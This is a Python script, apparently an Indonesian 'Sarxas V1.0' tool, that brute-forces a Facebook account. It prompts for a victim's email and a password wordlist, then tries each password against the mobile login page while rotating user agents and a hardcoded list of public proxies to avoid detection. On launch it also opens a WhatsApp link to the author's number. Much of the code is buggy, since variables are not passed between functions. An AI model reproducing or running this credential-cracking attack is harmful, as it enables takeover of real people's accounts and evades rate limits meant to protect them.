#!/bin/usr/python
#Mau apa lu
#Mau recode
#lu Ubah nama author, tetep lu ga akan dianggap pro
#Jadi fucklah yg merecode ini script
#w Sumpahin yg merecode akan di timpa musibah seumur hidup aminn
#Saya bersumpah Tidak akan merecode ini script, jika tidak maka saya akan di timpa musibah
#Arigato Gozaimasu udh make
#Uwwu >//<

import requests
import time
import sys
import os
from bs4 import BeautifulSoup
import random

sleep = time.sleep

user_agent = [
    #Chrome 
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 
    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36', 
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36', 
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36', 
    #Firefox 
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko', 
    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko', 
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko', 
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)', 
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko', 
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)', 
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)', 
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
    
    ]
    
proxie_list = [
    'http://10.10.1.10:3128', 
    'http://77.232.139.200:8080',
    'http://78.111.125.146:8080', 
    'http://77.239.133.146:3128',
    'http://74.116.59.8:53281', 
    'http://67.53.121.67:8080',
    'http://67.78.143.182:8080',
    'http://62.64.111.42:53281',
    'http://62.210.251.74:3128', 
    'http://62.210.105.103:3128', 
    'http://5.189.133.231:80',
    'http://46.101.78.9:8080', 
    'http://45.55.86.49:8080',
    'http://40.87.66.157:80', 
    'http://45.55.27.246:8080',
    'http://45.55.27.246:80', 
    'http://41.164.32.58:8080',
    'http://45.125.119.62:8080',
    'http://37.187.116.199:80', 
    'http://43.250.80.226:80',
    'http://43.241.130.242:8080',
    'http://38.64.129.242:8080', 
    'http://41.203.183.50:8080',
    'http://36.85.90.8:8080', 
    'http://36.75.128.3:80',
    'http://36.81.255.73:8080', 
    'http://36.72.127.182:8080', 
    'http://36.67.230.209:8080',
    'http://35.198.198.12:8080',
    'http://35.196.159.241:8080', 
    'http://35.196.159.241:80',
    'http://27.122.224.183:80', 
    'http://223.206.114.195:8080',
    'http://221.120.214.174:8080', 
    'http://223.205.121.223:8080', 
    'http://222.124.30.138:80',
    'http://222.165.205.204:8080', 
    'http://217.61.15.26:80', 
    'http://217.29.28.183:8080',
    'http://217.121.243.43:8080',
    'http://213.47.184.186:8080', 
    'http://207.148.17.223:8080',
    'http://210.213.226.3:8080',
    'http://202.70.80.233:8080', 

    ]
    
def main():
    os.system("sleep 2")
    os.system("clear")
    os.system("xdg-open https://wa.me/6289652884613/?text=Hae%20Sayang:v")
    sleep(2)
    os.system("clear")
    sleep(2)
    url = "https://m.facebook.com/login"
    sleep(2)
    print ("""
            +===============================+
            |˙˙˙˙˙˙˙˙˙˙Sarxas V1.0˙˙˙˙˙˙˙˙˙˙|
            +-------------------------------+
            | - Dengan adanya Tools ini     |
            |   tidak akan menjadikanmu     |
            |   sebagai hacker, cracker     |
            |   dll                         |
            |   Tools ini dibuat untuk      |
            |   Kebaikan, maka saya         |
            |   tidak akan bertanggung      |
            |   Jawab jika Tools ini        |
            |   digunakan untuk kejahatan   |
            +-------------------------------+
            |˙˙˙˙˙˙˙˙˙˙Sarxas V1.0˙˙˙˙˙˙˙˙˙˙|
            +===============================+
            [√] Author = D@rk_Devil#666
            [√]   WA   = 089652884613
            [√] Copyright © 2019 Farrel
            [!] Kami Melihatmu...
    """)
    print ("Example : emailkorban@gmail.com")
    sleep(2)
    email = input("[?] Email Korban : ")
    sleep(2)
    sandi = input("[?] Password List : ")
    sleep(2)
    retas = open(sandi, 'r')
    print ("Memulai Mengcrack...")
    cek()
    
def cek():
    for password in retas:
        form_data = {
            'email' : email,
            'pass' : password
        }
        user_agent_list = random.choice(user_agent)
        headers = {'Headers': user_agent_list}
        proxies_s = random.choice(proxie_list)
        proxie = {'http':proxies_s}
        
        with requests.Session() as x:
            x.get(url, data=form_data, proxies=proxie)
            f = x.post(url, data=form_data, headers=headers, proxies=proxie)
            d = x.get('https://m.facebook.com/home.php', headers=headers, proxies=proxie)
            soup = BeautifulSoup(d.content, 'html.parser')
            a = soup.find('title')
            if str(a) == '<title>Masuk Facebook | Facebook</title>':
                print ('Mengcrack', password, end="", flush=True)
                print ('\r', end="", flush=True)
            else:
                print ('Mengcrack', password, end="", flush=True)
                sleep(1)
                print ('Login Sukses\n')
                print ('Email :' + email)
                print ('Password :' + password)
                exit()
    print ('Worldlist habis, Silahkan Coba lagi...')



if __name__ == "__main__":
    main()